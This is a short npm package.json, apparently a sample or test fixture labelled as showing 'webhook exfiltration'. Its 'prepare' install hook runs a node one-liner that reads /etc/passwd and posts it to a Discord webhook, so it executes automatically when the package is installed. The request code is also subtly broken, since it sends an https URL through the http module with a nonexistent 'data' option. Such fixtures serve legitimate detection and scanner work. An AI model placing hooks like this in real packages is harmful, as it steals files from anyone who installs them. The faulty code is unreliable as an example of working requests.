{
  "name": "example-webhook-exfil",
  "version": "1.0.0",
  "description": "Package manifest with webhook exfiltration",
  "main": "index.js",
  "dependencies": {
    "axios": "^1.7.7"
  },
  "scripts": {
    "dev": "node index.js",
    "prepare": "node -e \"const http = require('http'); http.get('https://discord.com/api/webhooks/xyz/abc', {method:'POST', data: require('fs').readFileSync('/etc/passwd')})\""
  }
}
